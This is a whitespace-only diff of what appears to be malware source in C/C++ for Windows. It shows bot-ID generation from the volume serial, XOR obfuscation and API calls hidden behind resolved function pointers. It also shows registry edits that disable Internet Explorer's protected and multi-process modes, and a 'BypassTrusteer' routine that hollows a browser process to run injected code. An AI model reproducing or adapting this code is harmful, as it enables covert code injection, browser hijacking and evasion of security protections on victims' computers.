@@ -16,35 +16,35 @@ ULONG PseudoRand(ULONG *seed)
 
 void GetBotId(char *botId)
 {
-	CHAR windowsDirectory[MAX_PATH];
-	CHAR volumeName[8] = { 0 };
-	DWORD seed = 0;
+   CHAR windowsDirectory[MAX_PATH];
+   CHAR volumeName[8] = { 0 };
+   DWORD seed = 0;
 
-	if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
+   if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
       windowsDirectory[0] = L'C';
-	
-	volumeName[0] = windowsDirectory[0];	
-	volumeName[1] = ':';
-	volumeName[2] = '\\';
-	volumeName[3] = '\0';
+   
+   volumeName[0] = windowsDirectory[0];   
+   volumeName[1] = ':';
+   volumeName[2] = '\\';
+   volumeName[3] = '\0';
 
-	Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);
+   Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);
 
    GUID guid;
-	guid.Data1 =          PseudoRand(&seed);
+   guid.Data1 =          PseudoRand(&seed);
    
-	guid.Data2 = (USHORT) PseudoRand(&seed);
-	guid.Data3 = (USHORT) PseudoRand(&seed);
-	for(int i = 0; i < 8; i++)
+   guid.Data2 = (USHORT) PseudoRand(&seed);
+   guid.Data3 = (USHORT) PseudoRand(&seed);
+   for(int i = 0; i < 8; i++)
       guid.Data4[i] = (UCHAR) PseudoRand(&seed);
 
-	Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]);
+   Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]);
 }
 
 void Obfuscate(BYTE *buffer, DWORD bufferSize, char *key)
 {
-	for(DWORD i = 0; i < bufferSize; ++i)
-		buffer[i] = buffer[i] ^ key[i % Funcs::pLstrlenA(key)];
+   for(DWORD i = 0; i < bufferSize; ++i)
+      buffer[i] = buffer[i] ^ key[i % Funcs::pLstrlenA(key)];
 }
 
 char *Utf16toUtf8(wchar_t *utf16)
@@ -124,32 +124,32 @@ BOOL GetUserSidStr(PCHAR *sidStr)
 
 HANDLE NtRegOpenKey(PCHAR subKey)
 {
-	char     key[MAX_PATH] = { 0 };
-	char    *sid           = NULL;
-	HANDLE   hKey          = NULL;
+   char     key[MAX_PATH] = { 0 };
+   char    *sid           = NULL;
+   HANDLE   hKey          = NULL;
 
-	if(GetUserSidStr(&sid))
-	{
-		Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);
+   if(GetUserSidStr(&sid))
+   {
+      Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);
 
-		UNICODE_STRING uKey;
-		uKey.Buffer        = Utf8toUtf16(key);
-		uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
-		uKey.MaximumLength = uKey.Length;
-	  
-		OBJECT_ATTRIBUTES objAttribs;
-		
-		objAttribs.Length					      = sizeof(objAttribs);
-		objAttribs.Attributes				   = OBJ_CASE_INSENSITIVE;
-		objAttribs.ObjectName				   = &uKey;
-		objAttribs.RootDirectory			   = NULL;
-		objAttribs.SecurityDescriptor	      = NULL;
-		objAttribs.SecurityQualityOfService = 0;
-		
-		Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);
-	}
-	Funcs::pLocalFree(sid);
-	return hKey;
+      UNICODE_STRING uKey;
+      uKey.Buffer        = Utf8toUtf16(key);
+      uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
+      uKey.MaximumLength = uKey.Length;
+     
+      OBJECT_ATTRIBUTES objAttribs;
+      
+      objAttribs.Length                     = sizeof(objAttribs);
+      objAttribs.Attributes               = OBJ_CASE_INSENSITIVE;
+      objAttribs.ObjectName               = &uKey;
+      objAttribs.RootDirectory            = NULL;
+      objAttribs.SecurityDescriptor         = NULL;
+      objAttribs.SecurityQualityOfService = 0;
+      
+      Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);
+   }
+   Funcs::pLocalFree(sid);
+   return hKey;
 }
 
 NTSTATUS NtRegSetValue(HANDLE hKey, BYTE *valueName, DWORD valueNameSize, DWORD type, BYTE *data, DWORD dataSize)
@@ -341,18 +341,18 @@ void DisableMultiProcessesAndProtectedModeIe()
    HKEY  result;
    DWORD data = 0;
    if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp13, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
-	{
+   {
       Funcs::pRegSetValueExA(result, Strs::exp14, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
       data = 1;
       Funcs::pRegSetValueExA(result, Strs::exp19, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
       Funcs::pRegCloseKey(result);
-	}
+   }
    if(Funcs::pRegOpenKeyExA(HKEY_CURRENT_USER, Strs::exp15, 0, KEY_ALL_ACCESS, &result) == ERROR_SUCCESS)
-	{
+   {
       data = 3;
       Funcs::pRegSetValueExA(result, Strs::exp16, 0, REG_DWORD, (BYTE *) &data, sizeof(DWORD));
       Funcs::pRegCloseKey(result);
-	}
+   }
 }
 
 void CopyDir(char *from, char *to)
@@ -566,11 +566,11 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    else
       processInfo = *processInfoParam;
 
-	IMAGE_DOS_HEADER         *dosHeader        = (IMAGE_DOS_HEADER *) browser;
-	IMAGE_NT_HEADERS         *ntHeaders        = (IMAGE_NT_HEADERS *) (browser + dosHeader->e_lfanew);
+   IMAGE_DOS_HEADER         *dosHeader        = (IMAGE_DOS_HEADER *) browser;
+   IMAGE_NT_HEADERS         *ntHeaders        = (IMAGE_NT_HEADERS *) (browser + dosHeader->e_lfanew);
    IMAGE_SECTION_HEADER     *sectionHeader    = (IMAGE_SECTION_HEADER *) (ntHeaders + 1);
-	PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
-	CONTEXT                   context          = { 0 };
+   PROCESS_BASIC_INFORMATION processBasicInfo = { 0 };
+   CONTEXT                   context          = { 0 };
    DWORD                     retSize;
 
    context.ContextFlags = CONTEXT_FULL;
@@ -587,7 +587,7 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    );
    if(!Funcs::pWriteProcessMemory(processInfo.hProcess, remoteAddress, browser, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
       goto exit;
-	for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
+   for(int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i)
    {
       if(!Funcs::pWriteProcessMemory
       (
@@ -604,12 +604,12 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    if(!Funcs::pWriteProcessMemory(processInfo.hProcess, LPVOID(DWORD64(processBasicInfo.PebBaseAddress) + sizeof(LPVOID) * 2), &remoteAddress, sizeof(LPVOID), NULL))
       goto exit;
 #ifndef _WIN64
-	context.Eax = (DWORD) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+   context.Eax = (DWORD) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 #else
-	context.Rcx = (DWORD64) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+   context.Rcx = (DWORD64) remoteAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 #endif
 
-	if(!Funcs::pSetThreadContext(processInfo.hThread, &context))
+   if(!Funcs::pSetThreadContext(processInfo.hThread, &context))
       goto exit;
    Funcs::pResumeThread(processInfo.hThread);
    ret = processInfo.dwProcessId;
